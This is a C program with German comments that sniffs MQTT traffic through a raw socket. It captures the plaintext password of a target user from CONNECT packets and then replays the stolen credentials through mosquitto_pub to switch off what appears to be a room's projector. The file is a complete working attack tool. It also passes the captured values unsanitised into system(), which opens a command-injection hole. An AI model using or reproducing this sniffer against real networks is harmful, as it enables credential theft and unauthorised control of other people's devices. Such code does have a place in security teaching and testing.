/*
Programm zum abfangen von dem Passwort eines Benutzers bei MQTT Nachrichten an einem bestimmten Port.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <signal.h>
#include <arpa/inet.h>

int sock_raw;
char *buffer;
char command[2000];
char user[256];
char pass[256];
unsigned short sniffport;

/*
Schliesse Socket, wenn offen und gebe Buffer frei, wenn noch nicht geschehen.
*/
void close_all(){
	if (sock_raw >= 0){
		close(sock_raw);
		sock_raw = -1;
	}
	if (buffer != NULL) {
		free(buffer);
		buffer = NULL;
	}
}

/*
Spezieller Handler bei Abbruch mit Strg+C um das Programm korrekt zu schliessen.
s: Signal ID
*/
void abbruch_handler(int s){
	close_all();
	exit(1);
}

/*
Verarbeite ein Nachrichtenpaket.
size: Groesse des Pakets
*/
int processPacket(ssize_t size){
	
	/*int i;*/
	int index;
	/*int header_size;
	ssize_t payload_size;*/
	
	char *packet;

	struct iphdr* ip;
	struct tcphdr* tcp;

	unsigned short* portp;
	unsigned short port;

	char mqtt[5];
	char mqisdp[7];
	char protocol[7];
	int plen;
	int clen;
	int userlen;
	int passlen;

	/* Protokoll Namen beider MQTT Versionen */
	strcpy(mqtt, "MQTT");
	strcpy(mqisdp, "MQIsdp");

	packet = get_tcp_payload(buffer, &ip, &tcp);

	/* Bestimme Ziel-Port des Pakets */
	portp = (unsigned short*)tcp;
	port = htons(portp[1]);
	
	/*header_size = packet-buffer;
	payload_size = size-header_size;*/		

	if (port == sniffport){ /* Wenn Paket zum korrekten Port */
		/*printf("%ld:%ld\n", size, payload_size);*/
		if((packet[0]>>4)== 1 ){ /* Wenn Connect Paket */
			
			/* Ueberspringe fixed header*/
			index = 1;
			while (packet[index]>>7){
				index++;
			}
			index = index+2;
			plen = packet[index];
			index++;
			
			/* Ueberprüfe Protokoll Namen im variable header */
			strncpy(protocol, packet+index, plen);
			if((plen == 6 && strncmp(protocol, mqisdp, plen)==0) || (plen == 4 && strncmp(protocol, mqtt, plen)==0)){
				index = index + plen + 1;
				/*printf("SecFlag: %d\n",((unsigned char)packet[index])>>6);*/
				if((((unsigned char)packet[index])>>6)==3){ /* Wenn Benutzername und Passwort in Paket enthalten */
					
					/* Ueberspringe Client Namen */
					index = index+4;
					clen = packet[index];
					index = index + clen + 2;
					userlen= packet[index];
					index++;
					
					if(strncmp(user, packet+index, userlen)==0){ /* Wenn Paket von erwuenschtem User */
						/*strncpy(user, packet+index, userlen);*/
						/*user[userlen]='\0';*/
						index = index + userlen + 1;
						
						/* Bestimme Passwort */
						passlen = packet[index];
						index++;
						strncpy(pass, packet+index, passlen);
						pass[passlen]='\0';
						printf("%d:%d\n", userlen, passlen);
						
						/* Passwort gefunden, leite Beendung des Programms ein. */
						return 1;
					}
				}
			}
		}
	}
	return 0;
}

/*
Hauptmethode erstellt Abbruch-Handler, startet Sniffer und sendet am Ende die "beamer_off"-Nachricht
moegliche commands:
./sniffer --> benutzt Default-Werte für Port und User
./sniffer <port> <user> --> spezifische Eingabe von Port und User
*/
int main(int argc, char **argv){

	struct sigaction sigIntHandler;
	
	socklen_t saddr_size;
	ssize_t data_size;
	struct sockaddr saddr;

	/* Usage */
	printf("You can enter Port first and User second after the command!\n");
	printf("If one or both are missing, the default values are used.\n");
	printf("Default-Port: 1883\n");
	printf("Default User: remote-control\n");
	
	/* Verarbeiten von spezifischen Eingaben */
	if(argc == 3){
		sniffport = (unsigned short) atoi(argv[1]);
		strcpy(user, argv[2]);
	} else {	
		sniffport = 1883;
		strcpy(user, "remote-control");
	}	

	/* Erstellen des Abbruch-Handlers */
	sigIntHandler.sa_handler = abbruch_handler;
	sigemptyset(&sigIntHandler.sa_mask);
	sigIntHandler.sa_flags = 0;

	sigaction(SIGINT, &sigIntHandler, NULL);

	/* Speicher allokieren */
	buffer = (char *)malloc(65536);

	/* Oeffnen des Socket */
	sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if(sock_raw < 0)
	{
		printf("Socket Error\n");
		free(buffer);
		return 1;
	}
	
	/* Abfangen der Pakete */
	while(1)
	{
		saddr_size = sizeof saddr;
		data_size = recvfrom(sock_raw, buffer, 65536, 0, &saddr, &saddr_size);

		if (processPacket(data_size)){
			break;
		}
	}

	/* Speicher und Socket freigeben */
	close_all();
	
	/* Beamer abschalten (system() auskommentieren bei Nutzung von Valgrind) */
	strcpy(command, "mosquitto_pub -m \"beamer_off\" -t \"/uos/93/E06/beamer-control\" -u ");
	strcat(command, user);
	strcat(command, " -P ");
	strcat(command, pass);
	printf("%s\n", command);
	system(command);
	
	printf("Finish!\n");
	return 0;
}
